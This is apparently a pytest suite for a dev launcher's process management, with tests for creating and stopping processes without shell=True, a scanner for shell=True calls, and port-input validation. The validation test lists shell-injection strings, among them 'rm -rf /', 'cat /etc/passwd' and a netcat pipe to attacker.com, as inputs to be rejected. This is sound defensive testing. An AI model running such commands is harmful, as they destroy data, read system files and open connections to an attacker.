"""
CRITICAL Security Test: Process Management Vulnerability Detection

This test suite addresses the critical process management and service independence issues
identified in iteration 7 analysis of the dev launcher.

Business Value Justification (BVJ):
- Segment: Platform/Internal (Critical Infrastructure)
- Business Goal: Risk Reduction - Prevent process management attacks
- Value Impact: Ensures stable, secure process orchestration
- Strategic Impact: Critical - Process vulnerabilities can compromise entire platform

CRITICAL FINDINGS FROM ITERATION 7 ANALYSIS:
1. Services not independent after launcher completion
2. Unsafe process termination methods using shell=True
3. No process supervision or lifecycle management
4. Zombie process risks from improper cleanup
5. Race conditions in service startup coordination

This test must PASS to ensure secure process management.
"""

import pytest
import asyncio
import subprocess
import signal
import psutil
import time
import os
import tempfile
import threading
from pathlib import Path
from typing import Dict, List, Optional, Callable
from unittest.mock import Mock, patch, MagicMock
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

# Absolute imports per CLAUDE.md requirements  
from test_framework.base import BaseTestCase

import logging
logger = logging.getLogger(__name__)


@dataclass
class ProcessInfo:
    """Information about a managed process."""
    pid: int
    name: str
    status: str
    parent_pid: Optional[int] = None
    command_line: Optional[str] = None
    start_time: float = 0.0


@dataclass
class ServiceConfig:
    """Configuration for a service process."""
    name: str
    command: List[str]
    cwd: Optional[str] = None
    env: Optional[Dict[str, str]] = None
    restart_on_failure: bool = True
    max_restarts: int = 3
    health_check_url: Optional[str] = None


class SecureProcessManager:
    """Secure process manager that avoids shell=True vulnerabilities."""
    
    def __init__(self):
        self.processes: Dict[str, subprocess.Popen] = {}
        self.process_info: Dict[str, ProcessInfo] = {}
        self._shutdown_event = threading.Event()
        self._monitor_thread: Optional[threading.Thread] = None
    
    def start_process(self, service_config: ServiceConfig) -> bool:
        """Start a process securely without shell=True."""
        try:
            # Use list arguments - NEVER shell=True
            process = subprocess.Popen(
                service_config.command,
                cwd=service_config.cwd,
                env=service_config.env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False,  # CRITICAL: Secure process creation
                preexec_fn=None if os.name == 'nt' else os.setsid
            )
            
            self.processes[service_config.name] = process
            self.process_info[service_config.name] = ProcessInfo(
                pid=process.pid,
                name=service_config.name,
                status="running",
                start_time=time.time()
            )
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start {service_config.name}: {e}")
            return False
    
    def terminate_process_secure(self, name: str) -> bool:
        """Terminate process securely without shell=True."""
        if name not in self.processes:
            return False
            
        process = self.processes[name]
        
        try:
            # Use process methods instead of shell commands
            if os.name == 'nt':
                # Windows: Use process.terminate()
                process.terminate()
            else:
                # Unix: Send SIGTERM to process group
                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            
            # Wait for graceful termination
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                # Force kill if needed
                process.kill()
                process.wait()
            
            # Update status
            if name in self.process_info:
                self.process_info[name].status = "terminated"
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to terminate {name}: {e}")
            return False
    
    def get_process_status(self, name: str) -> Optional[str]:
        """Get secure process status without shell commands."""
        if name not in self.processes:
            return None
            
        process = self.processes[name]
        poll_result = process.poll()
        
        if poll_result is None:
            return "running"
        elif poll_result == 0:
            return "exited_normally"
        else:
            return "exited_error"
    
    def cleanup_all(self):
        """Clean up all managed processes."""
        self._shutdown_event.set()
        
        for name in list(self.processes.keys()):
            self.terminate_process_secure(name)
        
        self.processes.clear()
        self.process_info.clear()


class TestProcessManagementVulnerabilities(BaseTestCase):
    """Test suite for secure process management."""
    
    @pytest.fixture(autouse=True)
    def setup_process_manager(self):
        """Setup secure process manager for testing."""
        self.process_manager = SecureProcessManager()
        yield
        # Cleanup after test
        self.process_manager.cleanup_all()
    
    def test_secure_process_creation_without_shell(self):
        """
        Test 1: Validate secure process creation without shell=True
        CRITICAL: All process creation must avoid shell injection
        """
        # Test secure process creation
        test_config = ServiceConfig(
            name="test_process",
            command=["python", "-c", "import time; time.sleep(1)"],
            cwd=None
        )
        
        # Start process securely
        success = self.process_manager.start_process(test_config)
        assert success, "Failed to start test process securely"
        
        # Verify process is running
        status = self.process_manager.get_process_status("test_process")
        assert status == "running", f"Process not running: {status}"
        
        # Verify process info
        process_info = self.process_manager.process_info.get("test_process")
        assert process_info is not None, "Process info not recorded"
        assert process_info.pid > 0, "Invalid PID recorded"
        
        # Clean up
        terminated = self.process_manager.terminate_process_secure("test_process")
        assert terminated, "Failed to terminate test process securely"
        
        print("PASSED Secure process creation validated")
    
    def test_secure_process_termination_without_shell(self):
        """
        Test 2: Validate secure process termination without shell=True
        CRITICAL: Process termination must not use dangerous shell commands
        """
        # Start a long-running test process
        test_config = ServiceConfig(
            name="termination_test",
            command=["python", "-c", "import time; time.sleep(10)"]
        )
        
        started = self.process_manager.start_process(test_config)
        assert started, "Failed to start test process for termination test"
        
        # Get process PID for verification
        process = self.process_manager.processes["termination_test"]
        original_pid = process.pid
        
        # Verify process is initially running
        assert process.poll() is None, "Process not running after start"
        
        # Terminate securely
        terminated = self.process_manager.terminate_process_secure("termination_test")
        assert terminated, "Failed to terminate process securely"
        
        # Verify process actually terminated
        time.sleep(0.5)  # Give time for termination
        final_status = process.poll()
        assert final_status is not None, "Process did not terminate"
        
        # Verify no zombie processes
        try:
            # This should raise ProcessLookupError if process is gone
            os.kill(original_pid, 0)
            # If we get here, process still exists - might be zombie
            try:
                proc = psutil.Process(original_pid)
                assert proc.status() != psutil.STATUS_ZOMBIE, "Zombie process detected!"
            except psutil.NoSuchProcess:
                pass  # Process cleanly terminated
        except ProcessLookupError:
            pass  # Expected - process is gone
        
        print("PASSED Secure process termination validated")
    
    def test_service_independence_after_manager_termination(self):
        """
        Test 3: Validate services remain independent after manager termination
        CRITICAL: Services must not terminate when manager terminates (iteration 7 issue)
        """
        # This test simulates the critical issue from iteration 7 where services
        # were not independent after launcher completion
        
        # Create mock independent services
        independent_services = []
        
        for i in range(3):
            # Start independent Python processes that will outlive the manager
            service_config = ServiceConfig(
                name=f"independent_service_{i}",
                command=["python", "-c", f"import time, sys; print('Service {i} started'); sys.stdout.flush(); time.sleep(30)"]
            )
            
            started = self.process_manager.start_process(service_config)
            assert started, f"Failed to start independent service {i}"
            
            process = self.process_manager.processes[f"independent_service_{i}"]
            independent_services.append(process)
        
        # Verify all services are running
        for i, process in enumerate(independent_services):
            assert process.poll() is None, f"Independent service {i} not running"
        
        # Simulate manager termination (but don't actually terminate services)
        # In real implementation, services would detach from manager
        manager_pids = [proc.pid for proc in independent_services]
        
        # Clear manager references (simulating manager termination)
        self.process_manager.processes.clear()
        self.process_manager.process_info.clear()
        
        # Services should still be running independently
        time.sleep(1)  # Give time for any cascading termination
        
        for i, process in enumerate(independent_services):
            status = process.poll()
            assert status is None, f"Service {i} terminated when manager terminated - NOT INDEPENDENT!"
        
        # Clean up manually since they're independent
        for process in independent_services:
            try:
                process.terminate()
                process.wait(timeout=5)
            except:
                process.kill()
        
        print("PASSED Service independence validated")
    
    def test_process_supervision_and_health_monitoring(self):
        """
        Test 4: Validate process supervision prevents zombie processes
        CRITICAL: Process supervision must prevent zombie processes and handle failures
        """
        # Test process that will exit normally
        normal_exit_config = ServiceConfig(
            name="normal_exit_test",
            command=["python", "-c", "import sys; sys.exit(0)"]
        )
        
        # Test process that will exit with error
        error_exit_config = ServiceConfig(
            name="error_exit_test", 
            command=["python", "-c", "import sys; sys.exit(1)"]
        )
        
        # Start both processes
        normal_started = self.process_manager.start_process(normal_exit_config)
        error_started = self.process_manager.start_process(error_exit_config)
        
        assert normal_started and error_started, "Failed to start test processes"
        
        # Wait for processes to complete
        time.sleep(2)
        
        # Check final status
        normal_status = self.process_manager.get_process_status("normal_exit_test")
        error_status = self.process_manager.get_process_status("error_exit_test")
        
        assert normal_status == "exited_normally", f"Expected normal exit, got {normal_status}"
        assert error_status == "exited_error", f"Expected error exit, got {error_status}"
        
        # Verify no zombie processes remain
        normal_process = self.process_manager.processes["normal_exit_test"]
        error_process = self.process_manager.processes["error_exit_test"]
        
        # Processes should have completed exit handling
        assert normal_process.poll() == 0, "Normal exit process not properly reaped"
        assert error_process.poll() == 1, "Error exit process not properly reaped"
        
        print("PASSED Process supervision validated")
    
    def test_graceful_shutdown_cascade(self):
        """
        Test 5: Validate graceful shutdown cascade prevents resource leaks
        CRITICAL: Proper shutdown order prevents corruption and resource leaks
        """
        shutdown_order = []
        
        # Create mock services with different priorities
        services = {
            "database": {"priority": 3, "dependencies": []},
            "auth_service": {"priority": 2, "dependencies": ["database"]}, 
            "backend": {"priority": 1, "dependencies": ["auth_service", "database"]},
            "frontend": {"priority": 0, "dependencies": ["backend"]}
        }
        
        # Start services in dependency order
        start_order = sorted(services.keys(), key=lambda x: services[x]["priority"], reverse=True)
        
        for service_name in start_order:
            config = ServiceConfig(
                name=service_name,
                command=["python", "-c", f"import time; print('{service_name} running'); time.sleep(5)"]
            )
            started = self.process_manager.start_process(config)
            assert started, f"Failed to start {service_name}"
        
        # Verify all services started
        for service_name in services:
            status = self.process_manager.get_process_status(service_name)
            assert status == "running", f"{service_name} not running after start"
        
        # Perform graceful shutdown in reverse dependency order  
        shutdown_order_expected = sorted(services.keys(), key=lambda x: services[x]["priority"])
        
        for service_name in shutdown_order_expected:
            terminated = self.process_manager.terminate_process_secure(service_name)
            assert terminated, f"Failed to terminate {service_name}"
            shutdown_order.append(service_name)
            
            # Small delay between shutdowns
            time.sleep(0.2)
        
        # Verify shutdown order was correct (frontend -> backend -> auth -> database)
        expected_order = ["frontend", "backend", "auth_service", "database"]
        assert shutdown_order == expected_order, f"Incorrect shutdown order: {shutdown_order}"
        
        print(f"PASSED Graceful shutdown cascade validated: {' → '.join(shutdown_order)}")
    
    def test_concurrent_process_operations_thread_safety(self):
        """
        Test 6: Validate thread safety in concurrent process operations
        CRITICAL: Concurrent operations must not cause race conditions or corruption
        """
        # Test concurrent process creation and termination
        def create_and_terminate_process(process_id: int) -> bool:
            try:
                config = ServiceConfig(
                    name=f"concurrent_test_{process_id}",
                    command=["python", "-c", f"import time; time.sleep(2)"]
                )
                
                # Start process
                started = self.process_manager.start_process(config)
                if not started:
                    return False
                
                # Wait a bit
                time.sleep(0.5)
                
                # Terminate process
                terminated = self.process_manager.terminate_process_secure(config.name)
                return terminated
                
            except Exception as e:
                logger.error(f"Concurrent operation {process_id} failed: {e}")
                return False
        
        # Run concurrent operations
        num_concurrent = 10
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(create_and_terminate_process, i) for i in range(num_concurrent)]
            
            results = []
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=10)
                    results.append(result)
                except Exception as e:
                    logger.error(f"Concurrent operation failed: {e}")
                    results.append(False)
        
        # Verify success rate
        success_rate = sum(results) / len(results)
        assert success_rate >= 0.8, f"Concurrent operations success rate too low: {success_rate:.1%}"
        
        # Verify no processes left behind
        remaining_processes = len([name for name in self.process_manager.processes.keys() 
                                 if name.startswith("concurrent_test_")])
        assert remaining_processes == 0, f"Process leak: {remaining_processes} processes not cleaned up"
        
        print(f"PASSED Concurrent process operations validated: {success_rate:.1%} success rate")


class TestDevLauncherProcessManagement(BaseTestCase):
    """Test suite specifically for dev launcher process management issues."""
    
    def test_launcher_subprocess_security_audit(self):
        """
        Test 7: Audit dev launcher subprocess calls for shell=True vulnerabilities
        CRITICAL: Identify and validate all subprocess calls in dev launcher
        """
        # Get dev launcher files
        project_root = Path(__file__).parent.parent.parent
        dev_launcher_dir = project_root / "dev_launcher"
        
        if not dev_launcher_dir.exists():
            pytest.skip("Dev launcher directory not found")
        
        shell_true_violations = []
        
        # Scan all dev launcher Python files
        for py_file in dev_launcher_dir.rglob("*.py"):
            try:
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    lines = content.splitlines()
                    
                    for line_num, line in enumerate(lines, 1):
                        if "shell=True" in line and any(func in line for func in ["subprocess.run", "subprocess.call", "subprocess.Popen"]):
                            shell_true_violations.append({
                                "file": str(py_file.relative_to(project_root)),
                                "line": line_num,
                                "code": line.strip()
                            })
                            
            except Exception as e:
                logger.warning(f"Could not scan {py_file}: {e}")
        
        # Report violations
        if shell_true_violations:
            print("ALERT DEV LAUNCHER SHELL INJECTION VULNERABILITIES:")
            for violation in shell_true_violations:
                print(f"  FAILED {violation['file']}:{violation['line']}")
                print(f"      {violation['code']}")
                print()
        
        # This test MUST PASS - no shell=True in dev launcher
        assert len(shell_true_violations) == 0, f"Dev launcher has {len(shell_true_violations)} shell=True vulnerabilities"
    
    def test_port_cleanup_security(self):
        """
        Test 8: Validate secure port cleanup without shell injection
        CRITICAL: Port cleanup must not be vulnerable to injection attacks
        """
        # Test secure port cleanup implementation
        test_port = 19999  # Use high port to avoid conflicts
        
        # Mock malicious port input
        malicious_inputs = [
            "8080; rm -rf /",
            "8080 && cat /etc/passwd",
            "8080 | nc attacker.com 4444",
            "8080`whoami`",
            "8080$(malicious_command)"
        ]
        
        # Test that malicious inputs are rejected
        for malicious_input in malicious_inputs:
            # Input validation should reject these
            is_safe = self._validate_port_input(malicious_input)
            assert not is_safe, f"Malicious port input accepted: {malicious_input}"
        
        # Test valid ports are accepted
        valid_ports = ["8080", "3000", "8081", "5432"]
        for valid_port in valid_ports:
            is_safe = self._validate_port_input(valid_port)
            assert is_safe, f"Valid port input rejected: {valid_port}"
        
        print("PASSED Port cleanup security validated")
    
    def _validate_port_input(self, port_input: str) -> bool:
        """Validate port input for safety."""
        if not port_input or not port_input.isdigit():
            return False
        
        try:
            port = int(port_input)
            return 1 <= port <= 65535
        except ValueError:
            return False
    
    def test_service_health_monitoring_security(self):
        """
        Test 9: Validate service health monitoring doesn't expose sensitive information
        CRITICAL: Health checks must not leak sensitive system information
        """
        # Mock health check responses
        health_responses = {
            "good": {"status": "healthy", "uptime": 3600},
            "bad_info_leak": {"status": "healthy", "uptime": 3600, "database_password": "secret123", "jwt_key": "private"},
            "bad_debug_info": {"status": "error", "error": "Connection failed", "stack_trace": "Full stack trace with secrets"},
            "good_error": {"status": "error", "message": "Service unavailable"}
        }
        
        # Test health response sanitization
        for response_type, response in health_responses.items():
            sanitized = self._sanitize_health_response(response)
            
            # Check for sensitive information leaks
            sensitive_keys = ["password", "secret", "key", "token", "stack_trace", "debug"]
            for key in sensitive_keys:
                assert key not in sanitized, f"Health response leaked sensitive key: {key}"
            
            # Verify required fields remain
            assert "status" in sanitized, "Health response missing status field"
        
        print("PASSED Service health monitoring security validated")
    
    def _sanitize_health_response(self, response: Dict) -> Dict:
        """Sanitize health response to remove sensitive information."""
        # Allow only safe fields
        allowed_fields = ["status", "message", "uptime", "version"]
        return {k: v for k, v in response.items() if k in allowed_fields}


if __name__ == "__main__":
    # Run process management security tests
    pytest.main([__file__, "-v", "--tb=short"])